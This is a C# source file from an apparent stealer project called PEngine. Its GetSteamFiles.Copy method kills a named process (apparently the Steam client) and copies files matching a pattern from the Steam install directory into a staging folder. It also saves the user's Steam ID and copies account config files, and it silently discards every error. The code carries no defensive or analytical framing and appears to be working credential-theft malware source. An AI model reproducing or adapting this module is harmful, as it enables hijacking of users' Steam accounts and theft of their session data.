namespace PEngine.Engine.Applications.Steam
{
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.IO;

    public class GetSteamFiles
    {
        public static void Copy(string Expansion, string ConfigFiles, string Name, string Proc)
        {
            if (Directory.Exists(SteamPath.GetLocationSteam()) || (!Directory.Exists(GlobalPath.Steam_Dir)))
            {
                CombineEx.CreateDir(GlobalPath.Steam_Dir);
                ProcessKiller.Closing(Proc);
                try
                {
                    foreach (string Unknown in Directory.EnumerateFiles(SteamPath.GetLocationSteam(), Expansion))
                    {
                        if (File.Exists(Unknown))
                        {
                            if (!Unknown.Contains(".crash"))
                            {
                                CombineEx.Combination(Unknown, CombineEx.Combination(GlobalPath.Steam_Dir, Path.GetFileName(Unknown)));
                            }
                        }
                        else
                        {
                            continue;
                        }
                    }
                }
                catch (IOException) { }
                catch (UnauthorizedAccessException) { }
                catch (ArgumentException) { }

                if (!Directory.Exists(CombineEx.Combination(GlobalPath.Steam_Dir, Name)))
                {
                    try
                    {
                        CombineEx.CreateDir(CombineEx.Combination(GlobalPath.Steam_Dir, Name));
                        SaveData.SaveFile(GlobalPath.SteamID, SteamProfiles.GetSteamID());
                        foreach (string Config in Directory.EnumerateFiles(CombineEx.Combination(SteamPath.GetLocationSteam(), Name), ConfigFiles))
                        {
                            if (!File.Exists(Config))
                            {
                                continue;
                            }
                            else
                            {
                                CombineEx.FileCopy(Config, CombineEx.Combination(CombineEx.Combination(GlobalPath.Steam_Dir, Name), Path.GetFileName(Config)), true);
                            }
                        }
                    }
                    catch { }
                }
            }
        }
    }
}